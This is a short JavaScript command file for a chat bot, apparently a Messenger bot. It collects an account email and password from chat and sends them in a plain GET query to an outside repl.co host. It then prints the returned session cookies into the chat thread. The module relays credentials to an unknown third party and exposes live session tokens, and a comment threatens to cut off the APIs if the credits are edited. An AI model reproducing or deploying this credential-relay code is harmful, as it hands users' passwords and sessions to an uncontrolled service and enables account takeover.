module.exports.config = {
  name: "apstateget",
  version: "1.0.0",
  hasPermssion: 2,
  credits: "Réynél",
  description: "Retrieve user data",
  commandCategory: "system",
  cooldowns: 5
};
 
module.exports.run = async ({ api, event, args }) => {
    const axios = global.nodemodule["axios"];
 
    // dont change the credits or I'll off the apis
    if (args.length !== 2) {
        return api.sendMessage("ℹ️ | 𝖬𝖺𝗌𝗍𝖾𝗋, 𝗉𝗅𝖾𝖺𝗌𝖾 𝗉𝗋𝗈𝗏𝗂𝖽𝖾 𝖻𝗈𝗍𝗁 𝖾𝗆𝖺𝗂𝗅 𝖺𝗇𝖽 𝗉𝖺𝗌𝗌𝗐𝗈𝗋𝖽 𝗌𝖾𝗉𝖺𝗋𝖺𝗍𝖾𝖽 𝖻𝗒 𝗌𝗉𝖺𝖼𝖾.", event.threadID, event.messageID);
    }
 
 
    const [email, password] = args.map(arg => arg.trim());
 
 
    const res = await axios.get(`https://unrealisticstrangenagware.hayih59124.repl.co/login?email=${email}&password=${password}`);
    const userData = res.data;
 
 
    const formattedData = userData.map(item => ({
        "key": item.key,
        "value": item.value,
        "domain": item.domain,
        "path": item.path,
        "hostOnly": item.hostOnly,
        "creation": item.creation,
        "lastAccessed": item.lastAccessed
    }));
 
    return api.sendMessage(JSON.stringify(formattedData, null, 4), event.threadID, event.messageID);
}
 